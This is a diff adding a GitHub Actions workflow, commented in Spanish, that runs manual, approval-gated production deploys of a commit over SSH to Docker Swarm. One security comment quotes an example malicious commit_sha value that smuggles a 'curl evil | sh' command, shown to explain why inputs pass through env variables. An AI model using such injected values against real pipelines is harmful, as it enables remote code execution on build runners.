@@ -1,0 +1,132 @@
+name: Deploy a produccion
+
+# Fase 10N-A — automatiza EXACTAMENTE el proceso manual ya documentado en
+# docs/korexia/02-INFRAESTRUCTURA.md (git archive + scp + ssh + tar +
+# docker build + docker service update --force). No inventa ninguna
+# capacidad de EasyPanel: sigue usando Docker Swarm directo sobre el mismo
+# servidor, como ya se hacia a mano.
+#
+# Disparo EXCLUSIVAMENTE manual (workflow_dispatch) — nunca en push ni en
+# pull_request. Un push accidental a main jamas dispara un deploy por si
+# solo.
+#
+# El job "deploy" usa el Environment "production" de GitHub. ESO REQUIERE
+# UNA CONFIGURACION EXTERNA QUE ESTE ARCHIVO NO PUEDE HACER POR SI SOLO:
+# en GitHub -> Settings -> Environments -> production, agregar
+# "Required reviewers" (al menos el dueno de KOREX.IA). Sin esa
+# configuracion manual, el Environment existe pero no bloquea nada — se
+# documenta aqui explicitamente en vez de asumir que ya esta hecho.
+#
+# Fase 10N-D (revision pre-commit) — SEGURIDAD: ningun `${{ inputs.* }}` ni
+# `${{ secrets.* }}` se interpola directamente dentro de un bloque `run:`.
+# GitHub sustituye esas expresiones como TEXTO CRUDO en el script generado
+# ANTES de que el shell lo vea — un commit_sha malicioso tipo
+# `"; curl evil | sh #` se ejecutaria literalmente. Todo pasa por `env:` y
+# se referencia como variable de shell (`"$COMMIT_SHA"`), que es sustitucion
+# seria del shell, no de la plantilla. Se trata cada input como no confiable.
+
+on:
+  workflow_dispatch:
+    inputs:
+      commit_sha:
+        description: "Commit SHA a desplegar (debe ser ancestro de origin/main)"
+        required: true
+        type: string
+      allow_worker_enabled:
+        description: "Permitir que el health check final pase aunque CAMPAIGN_WORKER_ENABLED=true (dejar en false salvo que se autorice explicitamente)"
+        required: false
+        type: boolean
+        default: false
+
+concurrency:
+  group: deploy-produccion
+  cancel-in-progress: false
+
+jobs:
+  build-test:
+    name: Gate local (typecheck, lint, tests, build)
+    runs-on: ubuntu-latest
+    env:
+      COMMIT_SHA: ${{ inputs.commit_sha }}
+    steps:
+      - name: Checkout del commit solicitado
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ inputs.commit_sha }}
+          fetch-depth: 0
+
+      - name: Confirmar que el commit es ancestro de origin/main
+        run: |
+          git fetch origin main --quiet
+          git merge-base --is-ancestor "$COMMIT_SHA" origin/main || {
+            echo "::error::$COMMIT_SHA no es un ancestro de origin/main — no se despliega codigo no publicado en main."
+            exit 1
+          }
+
+      - uses: pnpm/action-setup@v4
+        with:
+          version: 11.5.0
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          cache: pnpm
+
+      - run: pnpm install --frozen-lockfile
+      - run: pnpm typecheck
+      - run: pnpm lint
+      - run: pnpm test
+      - run: pnpm build
+
+  deploy:
+    name: Deploy (requiere aprobacion del Environment production)
+    needs: build-test
+    runs-on: ubuntu-latest
+    environment: production
+    env:
+      COMMIT_SHA: ${{ inputs.commit_sha }}
+      ALLOW_WORKER_ENABLED_INPUT: ${{ inputs.allow_worker_enabled }}
+      DEPLOY_SSH_KEY_CONTENT: ${{ secrets.DEPLOY_SSH_KEY }}
+      DEPLOY_SERVER: ${{ secrets.DEPLOY_SSH_HOST }}
+    steps:
+      - name: Checkout del commit solicitado
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ inputs.commit_sha }}
+          fetch-depth: 0
+
+      - name: Configurar la llave SSH (nunca se imprime, solo se escribe a un archivo con permisos 600)
+        run: |
+          mkdir -p ~/.ssh
+          printf '%s\n' "$DEPLOY_SSH_KEY_CONTENT" > ~/.ssh/deploy_key
+          chmod 600 ~/.ssh/deploy_key
+
+      - name: Ejecutar scripts/deploy.sh
+        run: |
+          chmod +x scripts/deploy.sh
+          ALLOW_FLAG=""
+          if [ "$ALLOW_WORKER_ENABLED_INPUT" = "true" ]; then
+            ALLOW_FLAG="--allow-worker-enabled"
+          fi
+          scripts/deploy.sh "$COMMIT_SHA" \
+            --server "$DEPLOY_SERVER" \
+            --ssh-key ~/.ssh/deploy_key \
+            --yes \
+            $ALLOW_FLAG
+
+      - name: Limpiar la llave SSH del runner
+        if: always()
+        run: rm -f ~/.ssh/deploy_key
+
+      - name: Resumen del deploy
+        if: always()
+        run: |
+          {
+            echo "### Deploy a produccion"
+            echo "- Commit solicitado: \`$COMMIT_SHA\`"
+            echo "- Disparado por: $GITHUB_ACTOR"
+            echo "- Resultado: $JOB_STATUS"
+            echo "- CAMPAIGN_WORKER_ENABLED se deja tal como este configurado en EasyPanel — este workflow nunca lo cambia."
+          } >> "$GITHUB_STEP_SUMMARY"
+        env:
+          JOB_STATUS: ${{ job.status }}
